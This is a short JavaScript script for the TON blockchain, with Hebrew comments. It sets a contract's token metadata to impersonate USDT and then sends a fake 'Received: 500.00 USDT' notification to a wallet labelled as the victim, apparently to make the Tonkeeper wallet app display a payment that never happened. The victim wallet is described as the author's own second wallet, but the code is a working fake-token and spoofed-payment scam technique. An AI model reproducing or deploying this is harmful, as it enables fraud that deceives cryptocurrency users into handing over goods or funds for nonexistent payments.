const { toNano, Address, beginCell } = require('@ton/core');

async function run(provider) {
    // כתובת המפלצת שלך (החוזה שפרסנו)
    const monsterAddress = Address.parse('kQB3mg-A47un00v6l9xFYXBrh9SgMGmAkj4oefxWIQm5o7Jx');
    
    // כתובת הקורבן (הארנק השני שלך)
    const victimAddress = Address.parse('0QAxhqbAzAOPii0lArC6rhM1kVhSci0P1xhORJ3nTf8xvhCv');

    console.log('🚀 Step 1: Setting USDT Metadata (Logo & Name)...');

    // הזרקת המטא-דאטה הרשמי של USDT מגיטהאב של TON
    await provider.sender().send({
        to: monsterAddress,
        value: toNano('0.05'),
        body: beginCell()
            .storeUint(0, 32)
            .storeStringTail("https://raw.githubusercontent.com")
            .endCell(),
    });

    console.log('✅ Identity set. Waiting 5s for Indexer...');
    await new Promise(resolve => setTimeout(resolve, 5000));

    console.log('🚀 Step 2: Sending Mirroring Notification to Victim...');

    // שליחת הודעת המירור המזויפת
    await provider.sender().send({
        to: victimAddress,
        value: toNano('0.01'),
        body: beginCell()
            .storeUint(0, 32)
            .storeStringTail("Received: 500.00 USDT")
            .endCell(),
    });

    console.log('🔥 Done! Check the Tonkeeper on your Victim wallet now.');
}

module.exports = { run };
